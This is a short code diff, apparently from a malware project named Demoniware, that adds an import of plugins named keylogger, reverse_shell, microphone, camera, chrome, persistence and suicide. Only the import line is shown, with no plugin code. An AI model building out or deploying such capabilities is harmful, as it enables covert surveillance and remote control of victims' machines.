@@ -17,6 +17,7 @@ from Crypto.Hash import SHA256
 from threading import Thread
 
 from plugins import load_plugin
+from plugins import camera, chrome, download_upload, keylogger, microphone, persistence, proc, reverse_shell, screenshot, suicide, system
 
 
 class Demoniware(object):
